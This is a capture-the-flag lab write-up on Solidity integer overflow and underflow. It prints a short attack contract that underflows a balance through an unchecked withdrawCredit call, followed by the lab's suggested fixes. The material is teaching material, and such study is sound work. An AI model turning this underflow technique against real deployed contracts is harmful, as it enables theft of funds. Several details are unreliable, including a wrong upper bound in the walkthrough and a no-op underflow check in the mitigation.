# Cheap Glitch

Looking at the first vulnerability



## Arithmetic Underflow / Overflow

Solidity is a language that processes integers based on how many bits they can contain, like _uint8_, meaning it can only have 8 bits, thus setting the maximum value it can hold to 255 (2^8 - 1). Integer Overflow happens when the uint (unsigned integer) reaches its byte size, but then we add something that, when added, will exceed the max balance and return to the first variable element, for example if it's an _uint8_, the maximum value it can hold is 255, if we add 1 to it it won't become 256, but it will turn into 0 (first variable element). The underflow is just the opposite, let's say we have the same _uint8_ and its current value is 0, then we subtract 1 from it, it won't become -1 since unsigned cannot be a negative number, instead it will become 255 (the maximum variable element). &#x20;



## How can Interger Overflow-Underflow happened?

### Solidility Version

Solidity with Version _0.6.0_ to _0.7.0_ compiler has the risk of integer underflow/overflow by default because there was no checking implemented in that compiler version, but the newest version of _0.8.0_ compiler will automatically take care of checking for overflows and underflows.&#x20;

### The Unchecked

The Solidity _unchecked_ keyword can play a crucial role in certain scenarios, offering the advantages of lower gas costs and bypassing certain checks. This keyword should only be used when the developers are sure the operation won't result in any security implication, like in this scenario.&#x20;

```solidity
function division(uint256 a, uint256 b) public pure returns(uint256){
    require(b < a, "Denominator cannot be smaller than Nominator");
    unchecked{
        return a / b;
    }
}
```

Only if it is used in a process like this, then we can just call it "save," or else maybe it possesses a security implication, just like in this scenario.

```solidity
pragma solidity ^0.8.0;

contract exampleOUInteger{
    function addition(uint8 a) public pure returns(uint8){
        unchecked{
            return 200 + a;
        }
    }
}
```

In the example above, we used it in Solidity version _0.8.0_, which should be safe, but no, if the _unchecked_ keyword is also used, it tells the compiler not to check the result or possibility in this operation, meaning it tells the compiler not to check for interger underflow and overflow. Let's say we input _61_ as the value for the _a_, it will then return _5_ because _255_ is the max it can hold, it has extra 6, since the overflow starts from 0, so it's like a _6 - 1_, thus returning _5_. &#x20;

### Inline Assembly

Inline assembly in Solidity is performed using the YUL language. Because YUL is a low-level language, integer overflow and underflow are possible since the compiler won't automatically check for them. Take this code as an example.

```solidity
uint8 test = 255;

function add() public pure returns(uint8 result){
    assembly{
        result := add(sload(test.slot), 1)
    }
    return result;
}
```

Running the code above would return _0_ since the maximum for type _uint8_ is 255, and adding 1 to it will make it overflow and return _0_.&#x20;

### Using Shift Operators

In solidity, overflow and underflow checks are not performed for shift operations like they are performed for other arithmetic operations. Thus, overflow and underflow are possible.

### Typecasting

A very common way this vulnerability exists is by typecasting a higher integer type like _uint256_ to a lower one like _uint8_.

***

Starting the lab. We got Capitol.sol and Setup.sol

{% code title="Setup.sol" lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "./Capitol.sol";

contract Setup {
    Capitol public capitol;

    constructor() {
        capitol = new Capitol();
    }

    function isSolved() public view returns(bool){
        return capitol.isRicher();
    }
}
```
{% endcode %}

{% code title="Capitol.sol" lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Capitol{
    
    bool public isRicher;
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = 1_000_000_000 ether;
    }

    function depositCredit(uint256 _amount) public payable{
        require(_amount > 1 ether, "Minimum deposit is 1 ether");
        require(msg.value == _amount, "There seems to be a mismatch!");
        unchecked{
            balanceOf[msg.sender] += _amount;
        }
    }

    function withdrawCredit(uint256 _amount) public{
        require(_amount > 0, "Must be greater than zero!");
        unchecked{
            balanceOf[msg.sender] -= _amount;
        }
    }

    function richerThanOwner() public{
        // The Casino is Not that stupid, they know that the balance beyond that is CHEATING!
        if(balanceOf[msg.sender] < 10_000_000_000_000 ether && balanceOf[msg.sender] > balanceOf[owner]){
            isRicher = true;
        }
    }
}

```
{% endcode %}

Setup.sol have the same thing as before. It deploys the Capitol contract and have the `Setup::isSolved()` function to check if user solved it.

Capital.sol have three variable.

* `isRicher`: Flag to determine if the challenge is solved.
* `owner`: Initialized to the deployer, with a balance of 1 billion ether.
* `balanceOf`: Tracks user balances.

And three function

* **`depositCredit(uint256 _amount)`** :
  * Requires `_amount > 1 ether` and `msg.value == _amount`.
  * Uses `unchecked` to bypass overflow checks, allowing arbitrary balance increases.
* **`withdrawCredit(uint256 _amount)`** :
  * Allows withdrawing funds without checking if the user has sufficient balance (due to `unchecked`), leading to **underflows** .
*   **`richerThanOwner()`** :

    * Sets `isRicher = true` if the caller's balance exceeds the owner's (`1e9 ether`) but is below `1e13 ether`.



So how to exploit? Our goal is to make the user's balance exceed the owner's (`1e9 ether`) but stay below `1e13 ether`. The exploit leverages **underflow** and **unchecked arithmetic** .

#### **How our`Attack.sol` Works**

1. **Exploit Underflow** :
   * The attacker calls `withdrawCredit(type(uint256).max - 1e27)` with a balance of `0`.
   * Calculation:\
     `0 - (type(uint256).max - 1e27)`\
     \= `1e27 + 1` (due to underflow, as `type(uint256).max + 1 = 0` in Solidity).
2. **Resulting Balance** :
   * Attacker's balance becomes `1e27 + 1 wei` (\~1e9 ether + 1 wei), which is **just above the owner's balance** (`1e27 wei`).
3. **Trigger `richerThanOwner`** :
   * The attacker's balance (`1e27 + 1 wei`) is:
     * Greater than the owner's balance (`1e27 wei`).
     * Less than `1e45 wei` (1e16 ether).
   * This sets `isRicher = true`, solving the challenge.

Here is the attack contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface Capitol {
    function withdrawCredit(uint256 _amount) external;
    function richerThanOwner() external;
}

contract Attack {
    Capitol public capitol;

    constructor(address _capitol) {
        capitol = Capitol(_capitol);
        // Underflow the balance to 1e27 + 1
        capitol.withdrawCredit(type(uint256).max - 1e27);
        // Trigger the check to set isRicher to true
        capitol.richerThanOwner();
    }
}
```

<figure><img src="../../.gitbook/assets/Screenshot (33).png" alt=""><figcaption></figcaption></figure>

`ENUMA{1_WEI_is_enough_to_be_the_richest}`

<figure><img src="../../.gitbook/assets/Screenshot (34).png" alt=""><figcaption></figcaption></figure>

After we solved the lab, casinoheist give the mitigation

"Now that you've successfully completed the heist, we will learn how to fix the problem that you just encountered. First of all, we notice that the contract is already using Solidity version _0.8.26_ and can be compiled with the latest version, so the version here is not the problem; the problem seems to lie in the _unchecked_, and let's add some more check "

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Capitol{
    
    bool public isRicher;
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = 1_000_000_000 ether;
    }

    function depositCredit(uint256 _amount) public payable{
        require(_amount > 1 ether, "Minimum deposit is 1 ether");
        require(msg.value == _amount, "There seems to be a mismatch!");
        // Remove the unchecked{}
        balanceOf[msg.sender] += _amount;
    }

    function withdrawCredit(uint256 _amount) public{
        require(_amount > 0, "Must be greater than zero!");
        require(balanceOf[msg.sender] - _amount >= 0, "You don't have this kind of money");
        // Remove the unchecked{}
        balanceOf[msg.sender] -= _amount;
    }

    function richerThanOwner() public{
        // The Casino is Not that stupid, they know that the balance beyond that is CHEATING!
        if(balanceOf[msg.sender] < 10_000_000_000_000 ether && balanceOf[msg.sender] > balanceOf[owner]){
            isRicher = true;
        }
    }
}
```

"The mitigation above seems enough to fix the vulnerability. There is also another way to make the operation more secure; we can use _OpenZeppelin's SafeMath_ library. Here is a little example for the _depositCredit()_ function that also uses the _SafeMath_ library. "

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Capitol {
    using SafeMath for uint256;  // Use SafeMath for uint256 operations

    bool public isRicher;
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = 1_000_000_000 ether;
    }

    function depositCredit(uint256 _amount) public payable {
        require(_amount > 1 ether, "Minimum deposit is 1 ether");
        require(msg.value == _amount, "There seems to be a mismatch!");
        // SafeMath addition
        balanceOf[msg.sender] = balanceOf[msg.sender].add(_amount);
    }

    function withdrawCredit(uint256 _amount) public {
        require(_amount > 0, "Must be greater than zero!");
        require(balanceOf[msg.sender] >= _amount, "Insufficient balance!");
        // SafeMath subtraction
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
    }

    function richerThanOwner() public {
        require(
            balanceOf[msg.sender] < 10_000_000_000_000 ether,
            "Invalid balance, suspicious activity!"
        );

        if (balanceOf[msg.sender] > balanceOf[owner]) {
            isRicher = true;
        }
    }
}
```
